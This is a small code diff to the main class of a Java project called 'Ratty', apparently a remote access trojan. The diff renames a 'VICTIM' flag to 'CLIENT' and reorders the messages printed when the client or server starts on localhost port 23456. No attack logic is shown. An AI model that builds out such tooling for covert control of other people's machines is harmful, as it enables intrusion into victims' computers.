@@ -8,7 +8,7 @@ import de.sogomn.rat.server.ActiveServer;
 
 public final class Ratty {
 	
-	public static final boolean VICTIM = false;
+	public static final boolean CLIENT = false;
 	
 	private Ratty() {
 		//...
@@ -37,14 +37,14 @@ public final class Ratty {
 	}
 	
 	public static void main(final String[] args) {
-		if (VICTIM) {
+		if (CLIENT) {
+			System.out.println("Starting client");
+			
 			connectToHost("localhost", 23456);
-			
-			System.out.println("Client started");
 		} else {
-			startServer(23456);
+			System.out.println("Starting server");
 			
-			System.out.println("Server started");
+			startServer(23456);
 		}
 	}
 	
